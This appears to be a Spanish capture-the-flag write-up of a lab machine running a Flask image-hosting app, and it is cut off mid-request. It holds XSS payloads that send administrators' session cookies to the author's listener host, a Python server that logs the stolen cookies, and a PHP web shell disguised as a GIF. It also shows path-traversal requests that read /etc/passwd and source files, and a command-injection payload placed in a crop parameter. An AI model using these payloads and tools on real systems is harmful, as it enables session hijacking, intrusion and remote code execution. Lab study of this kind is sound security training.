### 1. Enumeración inicial

Empezamos enumerando los puertos abiertos de la máquina:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.88 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-12 19:09 +0000
Initiating SYN Stealth Scan at 19:09
Scanning 10.10.11.88 [65535 ports]
Discovered open port 22/tcp on 10.10.11.88
Discovered open port 8000/tcp on 10.10.11.88
Completed SYN Stealth Scan at 19:09, 14.08s elapsed (65535 total ports)
Nmap scan report for 10.10.11.88
Host is up, received user-set (0.073s latency).
Scanned at 2025-11-12 19:09:05 WET for 14s
Not shown: 64587 closed tcp ports (reset), 946 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
           Raw packets sent: 70018 (3.081MB) | Rcvd: 67474 (2.699MB)
```

Vemos que el servidor web de esta máquina está en el puerto 8000. La página de primeras solo muestra una función de registro. Si registramos un usuario en la página vemos que hay una función de subida de imágenes. 

Igual no parece que vayan por aquí los tiros, ninguna extensión o fichero consigue saltarse las sanitizaciones y ejecutar código php. 

Mirando el código fuente de la página me encuentro con que hay una ruta `http://10.10.11.88:8000/report_bug`. Se le puede enviar datos por POST pasando la cookie de sesión de mi usuario, y me devuelve **que la solicitud será revisada por un administrador**.

```bash
curl -X POST http://10.10.11.88:8000/report_bug \
  -H "Content-Type: application/json" \
  -d '{"bugName":"Test","bugDetails":"<script>alert(1)</script>"}' -b "session=.eJxNjUEKhTAMBe-StYgIgrjSpacooU0l0KRi6kLEu_tdfHE5Mw_eCYFtTXjMAQboY9s01EWogG0KwgpDxGT0sGNZabOsWFgXV8jKbrR9F3_n0Pu8a3nbIxWFfh84LoKcap8FrhskHi13.aRTbsg.tCWaiD3bTAEj_pHfEmMq4F8Y1oA"
{"message":"Bug report submitted. Admin review in progress. ","success":true}
```

---
### 2. Enumeración web — XSS en report_bug

Por el código Javascript de la página podemos presuponer que va a tirar de **XSS**, vamos a ponerlo a prueba:

```bash
curl -X POST http://10.10.11.88:8000/report_bug \
  -H "Content-Type: application/json" \
  -b "session=.eJxNjUEKhTAMBe-StYgIgrjSpacooU0l0KRi6kLEu_tdfHE5Mw_eCYFtTXjMAQboY9s01EWogG0KwgpDxGT0sGNZabOsWFgXV8jKbrR9F3_n0Pu8a3nbIxWFfh84LoKcap8FrhskHi13.aRTbsg.tCWaiD3bTAEj_pHfEmMq4F8Y1oA" \
  -d '{"bugName":"Image Test","bugDetails":"<img src=\"http://10.10.14.209:8006/?c=\"+document.cookie>"}'
  
  
  
{"message":"Bug report submitted. Admin review in progress. ","success":true}
```

Este payload funcionó parcialmente:

```bash
python3 -m http.server 8006
Serving HTTP on 0.0.0.0 port 8006 (http://0.0.0.0:8006/) ...
10.10.11.88 - - [12/Nov/2025 20:02:55] "GET /?c= HTTP/1.1" 200 -
```

Tras probar diferentes payloads dí con este que funciona fenomenal:

```bash
curl -X POST http://10.10.11.88:8000/report_bug \
  -H "Content-Type: application/json" \
  -b "session=.eJxNjTEKgDAMRe-SWQTFRScdPUUJbZRAk4qpg4h3VwfF8b334R8Q2JaI-xigg1BVU1vXDRTANgRhhW7CaPSwY1lotaSYWWeXyfJmtP4Xr3Pofdo0f-2RikL3B_azIMfSJ4HzAg97LUQ.aRW2SA.7jQIh0wvGYOctgFfr5Jd4wnrTb0" \
  -d '{"bugName":"Test C","bugDetails":"<img src=\"http://10.10.14.209:3333/c?c=\" onerror=\"this.src=this.src+document.cookie\">"}'
```

Apoyándome en la IA creamos un servidor de python escuchando en el puerto 3333, listo para recibir las cookies de este payload especifico basado en **onerror**:

```python
import socket
from urllib.parse import parse_qs, unquote, urlparse
from datetime import datetime

def enhanced_cookie_server(port=3333):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"🎯 Listening on port {port}...")
    print(f"📡 Waiting for XSS triggers with cookies...\n")
    
    while True:
        try:
            client, addr = server.accept()
            request = client.recv(4096).decode('utf-8', errors='ignore')
            
            # Extraer la primera línea (GET /path HTTP/1.1)
            first_line = request.split('\n')[0] if '\n' in request else request
            path = first_line.split(' ')[1] if ' ' in first_line else '/'
            
            print(f"[{datetime.now()}] Connection from: {addr[0]}")
            print(f"📍 Full Path: {path}")
            
            # Extraer la ruta base (sin parámetros)
            base_path = path.split('?')[0] if '?' in path else path
            print(f"📂 Route: {base_path}")
            
            # Buscar parámetros en cualquier ruta
            if '?' in path:
                query_string = path.split('?', 1)[1]
                params = parse_qs(query_string)
                print(f"🔍 All parameters: {params}")
                
                # Buscar parámetro 'c' en cualquier ruta
                cookies = params.get('c', [''])[0]
                cookies = unquote(cookies)
                
                if cookies:
                    print(f"🔥 COOKIES CAPTURED from {base_path}: {cookies}")
                    
                    with open("cookies.log", "a") as f:
                        f.write(f"{datetime.now()} - {addr[0]} - Route: {base_path} - Cookies: {cookies}\n")
                else:
                    print(f"❌ Parameter 'c' found in {base_path} but empty")
            else:
                print(f"ℹ️  No parameters found in {base_path}")
            
            # Enviar respuesta HTTP básica con imagen
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: image/png\r\n"
                "Content-Length: 68\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            # PNG 1x1 transparente
            png_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x00\x00\x00\x00IEND\xaeB`\x82'
            
            client.send(response.encode() + png_data)
            client.close()
            
        except Exception as e:
            print(f"Error: {e}")
            try:
                client.close()
            except:
                pass

if __name__ == '__main__':
    enhanced_cookie_server(3333)

```

Podemos recibir varios `Parameter 'c' found in /c but empty` antes de que recibamos las cookies, lo mejor sería un puerto como 8001 o así menos sospechoso también, en los logs de javascript en el navegador detecta el 3333 como UNSAFE PORT, aunque en este caso no afectó mucho:

```bash
python3 xss_server.py
🎯 Listening on port 3333...
📡 Waiting for XSS triggers with cookies...

[2025-11-13 12:04:11.967103] Connection from: 10.10.11.88
📍 Full Path: /c?c=
📂 Route: /c
🔍 All parameters: {}
❌ Parameter 'c' found in /c but empty
[2025-11-13 12:04:12.125183] Connection from: 10.10.11.88
📍 Full Path: /c?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ
📂 Route: /c
🔍 All parameters: {'c': ['session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ']}
🔥 COOKIES CAPTURED from /c: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ
```

---
### 3. Acceso como administrador y LFI

Bien, **tenemos las cookies de un administrador**. Vamos a ponerlas en el navegador y entraremos automáticamente con la cuenta de administrador.

Como administrador, vamos a subir un .gif de prueba:

```php
GIF8; <?php system($_GET['cmd']); ?>
```

Lo subimos como **holamundo.gif** por el momento a la página, es importante no subirlo como cmd.gif ya que la sanitización filtra `cmd`. 

Ahora bien, podemos ver en el panel de administración un botón para ver en la web los logs de un usuario prueba en la web, aunque **manda error como si no existiera el archivo**. 

Del usuario admin hay un botón de **Download log**. En la URL en vez de ir a descargar el log vamos a manipular el parámetro `?log_identifier` para apuntar a algún archivo del sistema:

```bash
❯ curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../etc/passwd' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
```

Funciona, tenemos un **LFI**. Ahora toca escalar a un RCE. Hasta donde sabemos por el output del `/etc/passwd`, y esta petición:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../var/log/auth.log' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'
{"message":"Error reading file: [Errno 13] Permission denied: '/home/web/web/system_logs/../../../../var/log/auth.log'","success":false}
```

Estoy con el usuario local **web**, el cual tiene una **/bin/bash**. Con **wappalyzer** vemos que la web usa **Flask**, vamos a enumerar los archivos principales de la página. Podemos leer **app.py** y **config.py**:

Fichero `app.py`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
    
```

Fichero `config.py`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../config.py' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'converted'), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_FOLDER, 'admin', 'transformed'), exist_ok=True)
os.makedirs(SYSTEM_LOG_FOLDER, exist_ok=True)

MAX_LOGIN_ATTEMPTS = 10
ACCOUNT_LOCKOUT_DURATION_MINS = 1

ALLOWED_MEDIA_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'pdf'}
ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM = {'jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff'}
ALLOWED_UPLOAD_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff',
    'application/pdf'
}
ALLOWED_TRANSFORM_MIME_TYPES = {
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/tiff'
}
MAX_FILE_SIZE_MB = 1
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

FORBIDDEN_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh', 'bat', 'cmd', 'js', 'jsp', 'asp', 'aspx', 'cgi', 'pl', 'py', 'rb', 'dll', 'vbs', 'vbe', 'jse', 'wsf', 'wsh', 'psc1', 'ps1', 'jar', 'com', 'svg', 'xml', 'html', 'htm'}
BLOCKED_APP_PORTS = {8080, 8443, 3000, 5000, 8888, 53}
OUTBOUND_BLOCKED_PORTS = {80, 8080, 53, 5000, 8000, 22, 21}
PRIVATE_IP_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('172.0.0.0/12'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16')
]
AWS_METADATA_IP = ipaddress.ip_address('169.254.169.254')
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'
```

Vemos referencias a ciertas utilidades que estan en desarrollo que no me dejan usar de primeras en la web principal, `api_upload.py` y `api_edit.py`. Miremos el contenido de estos archivos:

Fichero `api_upload.py`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../api_upload.py' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

from utils import allowed_file, get_file_mimetype, _sanitize_input, _load_data, _save_data, _log_event, _generate_display_id, _deobfuscate_url, _is_private_ip
from config import ALLOWED_MEDIA_EXTENSIONS, MAX_FILE_SIZE_BYTES, MAX_FILE_SIZE_MB, ALLOWED_UPLOAD_MIME_TYPES
from flask import Blueprint, request, jsonify, session
from werkzeug.utils import secure_filename
from urllib.parse import urlparse
from config import *
import requests
import socket
import ipaddress
from datetime import datetime
import tempfile
import os
import uuid

bp_upload = Blueprint('bp_upload', __name__)

@bp_upload.route('/upload_image', methods=['POST'])
def upload_image():
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    if 'file' not in request.files:
        return jsonify({'success': False, 'message': 'No file part in the request.'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'success': False, 'message': 'No selected file.'}), 400
    if not allowed_file(file.filename, ALLOWED_MEDIA_EXTENSIONS):
        return jsonify({'success': False, 'message': 'File type not allowed by extension.'}), 400
    file.seek(0, os.SEEK_END)
    file_size = file.tell()
    file.seek(0)
    if file_size > MAX_FILE_SIZE_BYTES:
        return jsonify({'success': False, 'message': f'File size exceeds {MAX_FILE_SIZE_MB}MB limit.'}), 413
    try:
        filename = secure_filename(file.filename)
        unique_filename = f"{uuid.uuid4()}_{filename}"
        filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
        file.save(filepath)
        actual_mimetype = get_file_mimetype(filepath)
        if actual_mimetype not in ALLOWED_UPLOAD_MIME_TYPES:
            os.remove(filepath)
            _log_event(session['username'], f"Blocked upload due to disallowed MIME type: {actual_mimetype} for file {filename}.")
            return jsonify({'success': False, 'message': 'Uploaded file has an unsupported content type.'}), 400
        title = _sanitize_input(request.form.get('title'), 'text', max_length=255)
        if not title:
            title = os.path.splitext(filename)[0]
        description = _sanitize_input(request.form.get('description', 'no description provided'), 'text', max_length=1000)
        group_name = _sanitize_input(request.form.get('group_name', 'Unsorted'), 'name', max_length=100)
        application_data = _load_data()
        image_id = str(uuid.uuid4())
        image_entry = {
            'id': image_id,
            'filename': unique_filename,
            'url': f'/uploads/{unique_filename}',
            'title': title,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': group_name,
            'type': 'original',
            'actual_mimetype': actual_mimetype
        }
        application_data['images'].append(image_entry)
        if not any(coll['name'] == group_name for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': group_name})
        _save_data(application_data)
        _log_event(session['username'], f"Uploaded image: {filename} (ID: {image_id}) to group '{group_name}'.")
        return jsonify({'success': True, 'message': 'Image uploaded successfully!', 'imageId': image_id}), 200
    except Exception as e:
        _log_event(session['username'], f"Error uploading image: {str(e)}")
        return jsonify({'success': False, 'message': f'Error uploading image: {str(e)}'}), 500
```

Fichero `api_edit.py`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../api_edit.py' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

---
### 4. Descubrimiento y explotación de Command Injection

Hay **Command Injection** crítico en `api_edit.py`.

En la función `apply_visual_transform()`, específicamente en el transform type **'crop'**:

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

- Usa `shell=True` (ejecuta en shell)
- Concatena directamente los parámetros sin sanitización    
- Los parámetros `x`, `y`, `width`, `height` vienen del usuario

Para explotar la vulnerabilidad:

Subimos una imagen válida cualquiera como administrador (**no va a funcionar de primeras**):

```bash
curl -X POST http://10.10.11.88:8000/upload_image \
  -F "file=@hola.gif" \
  -F "title=test" \
  -b "session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ"
  
  
{"imageId":"70dffc59-e50d-4fbc-9833-90c5454eab3d","message":"Image uploaded successfully!","success":true}
```

Ahora con el **imageId** obtenido enviamos la siguiente petición:

```bash
curl -X POST http://10.10.11.88:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -b "session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ" \
  -d '{
    "imageId": "70dffc59-e50d-4fbc-9833-90c5454eab3d",
    "transformType": "crop",
    "params": {
      "x": "0; whoami > /tmp/pwned.txt; echo",
      "y": "0",
      "width": "100", 
      "height": "100"
